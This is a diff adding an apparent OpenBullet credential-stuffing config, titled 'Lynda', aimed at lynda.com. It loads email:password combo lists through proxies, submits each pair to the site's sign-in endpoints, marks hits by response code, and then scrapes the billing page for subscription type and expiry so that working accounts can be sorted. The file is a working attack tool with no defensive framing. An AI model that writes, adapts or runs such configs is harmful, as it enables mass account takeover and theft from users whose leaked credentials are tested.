@@ -1,0 +1,76 @@
+[SETTINGS]
+{
+  "Name": "Lynda",
+  "SuggestedBots": 100,
+  "LastModified": "2018-06-12T03:49:08.0815847+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#REQUEST_-_- REQUEST GET "https://www.lynda.com/ajax/signin/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_-_- PARSE "<SOURCE>" CSS "[name=-_-] " "value" 0 -> VAR "-_-" "" "" 
+#REQUEST_EMAIL_(POST) REQUEST POST "https://www.lynda.com/ajax/signin/password" AutoRedirect=TRUE 
+  CONTENT "-_-=<-_->&email=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Referer: https://www.lynda.com/signin" 
+  HEADER "Origin: https://www.lynda.com" 
+  HEADER "-_-: <-_->" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "418" 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" Contains "200" 
+#REQUEST_PASS_(POST) REQUEST POST "https://www.lynda.com/ajax/signin/user" AutoRedirect=TRUE 
+  CONTENT "-_-=<-_->&email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Referer: https://www.lynda.com/signin/password" 
+  HEADER "Origin: https://www.lynda.com" 
+  HEADER "-_-: <-_->" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "418" 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" Contains "200" 
+#REQUEST_INFO_(GET) REQUEST GET "https://www.lynda.com/home/userAccount/AccountBilling.aspx" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referee: https://www.lynda.com/signin/password" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+#PARSE_SUBSCRIPTION_TYPE PARSE "<SOURCE>" LR "                    <p>" "</p>" Recursive=FALSE -> CAP "Subsctiption Type" "" "" 
+#PARSE_EXPIRATION_DATE/RENEW PARSE "<SOURCE>" LR "<p>Subscription" "</p>" Recursive=FALSE -> CAP "Subscription Attributes" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "<p>Preview</p>" 
+    KEY "no-touch non-member slim-header\">" 
